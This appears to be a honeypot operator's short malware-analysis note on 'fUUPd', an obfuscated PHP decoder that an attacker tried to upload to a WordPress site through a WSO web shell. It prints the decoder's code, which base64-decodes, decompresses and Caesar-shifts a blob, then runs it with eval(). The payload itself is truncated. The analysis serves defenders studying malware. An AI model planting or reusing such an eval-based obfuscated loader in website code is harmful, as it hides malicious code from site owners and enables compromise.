# fUUPd - Common Decoder #1

A fairly basic decoder.

## Origin

### Download

The attacker intended to use a WSO, "Web Shell by oRb" instance
to download the code to my WordPress honey pot. The attacker
wanted to use the "FilesMan" action of WSO, "uploadFile" sub-action.

This would leave a file behind.

## Decoder

    <?php
    function fUUPd($NVAR)
    {
        $NVAR = gzinflate(base64_decode($NVAR));
        for ($i = 0; $i < strlen($NVAR); $i++) {
            $NVAR[$i] = chr(ord($NVAR[$i]) - 1);
        }
        return $NVAR;
    }
    eval(fUUPd("jbvnz.../9y//5f/x/"));

Decompresses decoded Base64-encoded bytes, then shifts them one
(numeric) value down. So for ASCII text, 'G' (0x47 as a number)
would become 'F' (0x46 as a number). That counts as a "Caesar Cipher".

Makes no attempt to hide the `base64_decode()` or `eval()` function calls,
but the function name `fUUPd` does seem to be obfuscated.
